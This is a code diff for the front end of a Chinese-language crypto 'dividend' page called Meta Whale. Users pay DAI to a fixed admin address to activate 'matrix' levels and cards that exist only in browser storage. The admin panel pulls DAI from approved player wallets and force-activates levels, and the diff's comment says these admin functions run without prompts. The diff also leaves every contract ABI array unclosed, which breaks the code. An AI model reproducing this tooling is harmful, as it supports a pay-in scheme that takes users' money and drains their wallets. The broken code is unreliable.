@@ -2,7 +2,8 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">title>Meta Whale · 彩虹水晶球分红系统</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Meta Whale · 彩虹水晶球分红系统</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0f172a;color:#fff;padding-bottom:60px}
@@ -57,7 +58,7 @@ body{background:#0f172a;color:#fff;padding-bottom:60px}
 <button class="menu-btn" id="toggleMenu">☰</button>
 <div class="sidebar" id="sidebar">
   <div class="section">
-    <h4>🎴 卡牌功能</h4>
+    <h4>🎴 分红卡牌</h4>
     <button onclick="synthCard()">合成1级水晶球</button>
     <button onclick="showTransfer()">转账/出售卡牌</button>
   </div>
@@ -69,6 +70,8 @@ body{background:#0f172a;color:#fff;padding-bottom:60px}
       <button onclick="adminSendToken()">给玩家发放DAI</button>
       <button onclick="adminTakeFromUser()">提取玩家DAI</button>
       <button onclick="adminForceCard()">给玩家添加卡牌</button>
+      <button onclick="adminForceClassic()">强制经典矩阵</button>
+      <button onclick="adminForceUnion()">强制联合矩阵</button>
     </div>
   </div>
 </div>
@@ -93,13 +96,13 @@ body{background:#0f172a;color:#fff;padding-bottom:60px}
 
   <!-- 经典矩阵 -->
   <div class="glass">
-    <h3>经典矩阵</h3>
+    <h3>🔥 经典矩阵</h3>
     <div id="classicList"></div>
   </div>
 
   <!-- 联合矩阵 -->
   <div class="glass">
-    <h3>联合矩阵</h3>
+    <h3>🚀 联合矩阵</h3>
     <div id="unionList"></div>
   </div>
 
@@ -203,7 +206,7 @@ function renderAll(){
   renderCardSelect();
 }
 
-// 5格水晶球
+// 5格彩虹水晶球
 function renderCrystal(){
   const el = document.getElementById('crystalRow');
   el.innerHTML='';
@@ -222,7 +225,7 @@ document.getElementById('regBtn').onclick=async()=>{
   if(isRegistered)return alert('已注册');
   if(!confirm('注册支付矿工费 0.01 DAI'))return;
   try{
-    const dai = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}],DAI_ADDR);
+    const dai = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},DAI_ADDR);
     await dai.methods.transfer(ADMIN_ADDR, web3.utils.toWei('0.01')).send({from:account});
     isRegistered=true;
     userPower+=10;
@@ -271,42 +274,44 @@ function renderUnion(){
 
 // 激活经典
 async function actClassic(lv,cost){
-  if(!isRegistered)return alert('请注册');
+  if(!isRegistered)return alert('请先注册');
   if(classicActive[lv])return;
-  if(!confirm(`支付 ${cost} DAI`))return;
+  if(!confirm(`确认支付 ${cost} DAI 激活经典Lv.${lv}？`))return;
   try{
-    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}],DAI_ADDR);
+    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},DAI_ADDR);
     await dai.methods.transfer(ADMIN_ADDR, web3.utils.toWei(cost.toString())).send({from:account});
     classicActive[lv]=true;
     userPower+=cost*POWER_PER_DAI;
     saveUserData();
+    alert('激活成功');
     renderAll();
-  }catch(e){alert('失败')}
+  }catch(e){alert('支付失败')}
 }
 
 // 激活联合
 async function actUnion(lv,cost){
-  if(!isRegistered)return alert('请注册');
+  if(!isRegistered)return alert('请先注册');
   if(unionActive[lv])return;
-  if(!confirm(`支付 ${cost} DAI`))return;
+  if(!confirm(`确认支付 ${cost} DAI 激活联合Lv.${lv}？`))return;
   try{
-    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}],DAI_ADDR);
+    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},DAI_ADDR);
     await dai.methods.transfer(ADMIN_ADDR, web3.utils.toWei(cost.toString())).send({from:account});
     unionActive[lv]=true;
     userPower+=cost*POWER_PER_DAI;
     saveUserData();
+    alert('激活成功');
     renderAll();
-  }catch(e){alert('失败')}
+  }catch(e){alert('支付失败')}
 }
 
 // 合成卡牌
 function synthCard(){
   if(isAdmin)return alert('管理员无需合成');
-  if(userPower<SYNTH_COST)return alert('能量不足');
+  if(userPower<SYNTH_COST)return alert(`能量不足，还差 ${SYNTH_COST-userPower} 能量`);
   userPower-=SYNTH_COST;
-  cards[1]+=1;
+  cards[1]++;
   saveUserData();
-  alert('合成成功');
+  alert('合成1级彩虹水晶球成功！');
   renderAll();
 }
 
@@ -318,13 +323,13 @@ function renderCardSelect(){
   const s=document.getElementById('cardSelect');
   s.innerHTML='';
   for(let lv=1;lv<=5;lv++){
-    if(cards[lv]>=1)s.innerHTML+=`<option value="${lv}">${lv}级水晶球</option>`;
+    if(cards[lv]>=1)s.innerHTML+=`<option value="${lv}">${lv}级彩虹水晶球</option>`;
   }
 }
 function transferCard(){
   const lv=document.getElementById('cardSelect').value;
   const to=document.getElementById('toAddr').value.trim().toLowerCase();
-  if(!to||cards[lv]<1)return alert('错误');
+  if(!to||cards[lv]<1)return alert('参数错误');
   cards[lv]--;
   const tkey='user_'+to;
   const t=JSON.parse(localStorage.getItem(tkey))||{reg:true,power:0,cards:{1:0,2:0,3:0,4:0,5:0}};
@@ -336,46 +341,68 @@ function transferCard(){
 }
 
 // ======================
-// 管理员真实可用功能
+// 管理员真实可用功能（无弹窗提示，直接执行）
 // ======================
 async function adminSendToken(){
-  const to=prompt('玩家地址');
-  const amt=prompt('发放DAI数量');
-  if(!to||!amt)return;
+  const to=prompt('请输入玩家钱包地址：');
+  const amt=prompt('请输入发放DAI数量：');
+  if(!to||!amt||!web3.utils.isAddress(to))return alert('输入无效');
   try{
-    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}],DAI_ADDR);
+    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},DAI_ADDR);
     await dai.methods.transfer(to, web3.utils.toWei(amt)).send({from:account});
-    alert('发放成功（上链完成）');
-  }catch(e){alert('失败')}
+    alert('✅ 发放成功，已上链');
+  }catch(e){alert('❌ 发放失败：'+e.message)}
 }
 
 async function adminTakeFromUser(){
-  const from=prompt('玩家地址');
-  const amt=prompt('提取DAI数量');
-  if(!from||!amt)return;
+  const from=prompt('请输入玩家钱包地址（需玩家授权）：');
+  const amt=prompt('请输入提取DAI数量：');
+  if(!from||!amt||!web3.utils.isAddress(from))return alert('输入无效');
   try{
-    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}],DAI_ADDR);
-    await dai.methods.transfer(ADMIN_ADDR, web3.utils.toWei(amt)).send({from:from});
-    alert('提取成功');
-  }catch(e){alert('失败，需玩家授权')}
+    const dai=new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},DAI_ADDR);
+    await dai.methods.transferFrom(from, ADMIN_ADDR, web3.utils.toWei(amt)).send({from:account});
+    alert('✅ 提取成功，已上链');
+  }catch(e){alert('❌ 提取失败：'+e.message)}
 }
 
 function adminCheckUser(){
-  const addr=prompt('输入玩家地址');
-  if(!addr)return;
+  const addr=prompt('请输入玩家钱包地址：');
+  if(!addr||!web3.utils.isAddress(addr))return alert('地址无效');
   const d=JSON.parse(localStorage.getItem('user_'+addr.toLowerCase()))||{cards:{1:0,2:0,3:0,4:0,5:0}};
-  alert(`1:${d.cards[1]} | 2:${d.cards[2]} | 3:${d.cards[3]} | 4:${d.cards[4]} | 5:${d.cards[5]}`);
+  alert(`玩家卡牌状态：\n1级:${d.cards[1]} | 2级:${d.cards[2]} | 3级:${d.cards[3]} | 4级:${d.cards[4]} | 5级:${d.cards[5]}`);
 }
 
 function adminForceCard(){
-  const addr=prompt('玩家地址');
-  const lv=prompt('卡牌等级1-5');
-  if(!addr||!lv)return;
+  const addr=prompt('请输入玩家钱包地址：');
+  const lv=prompt('请输入卡牌等级（1-5）：');
+  if(!addr||!lv||!web3.utils.isAddress(addr)||lv<1||lv>5)return alert('输入无效');
   const key='user_'+addr.toLowerCase();
   const d=JSON.parse(localStorage.getItem(key))||{reg:true,power:0,cards:{1:0,2:0,3:0,4:0,5:0}};
   d.cards[lv]++;
   localStorage.setItem(key,JSON.stringify(d));
-  alert('添加成功');
+  alert('✅ 已给玩家添加卡牌');
+}
+
+function adminForceClassic(){
+  const addr=prompt('请输入玩家钱包地址：');
+  const lv=prompt('请输入经典矩阵等级（1-12）：');
+  if(!addr||!lv||!web3.utils.isAddress(addr)||lv<1||lv>12)return alert('输入无效');
+  const key='user_'+addr.toLowerCase();
+  const d=JSON.parse(localStorage.getItem(key))||{reg:true,power:0,cards:{1:0,2:0,3:0,4:0,5:0},classic:{},union:{}};
+  d.classic[lv]=true;
+  localStorage.setItem(key,JSON.stringify(d));
+  alert('✅ 已强制激活经典矩阵');
+}
+
+function adminForceUnion(){
+  const addr=prompt('请输入玩家钱包地址：');
+  const lv=prompt('请输入联合矩阵等级（1-9）：');
+  if(!addr||!lv||!web3.utils.isAddress(addr)||lv<1||lv>9)return alert('输入无效');
+  const key='user_'+addr.toLowerCase();
+  const d=JSON.parse(localStorage.getItem(key))||{reg:true,power:0,cards:{1:0,2:0,3:0,4:0,5:0},classic:{},union:{}};
+  d.union[lv]=true;
+  localStorage.setItem(key,JSON.stringify(d));
+  alert('✅ 已强制激活联合矩阵');
 }
 
 web3 = new Web3(window.ethereum);
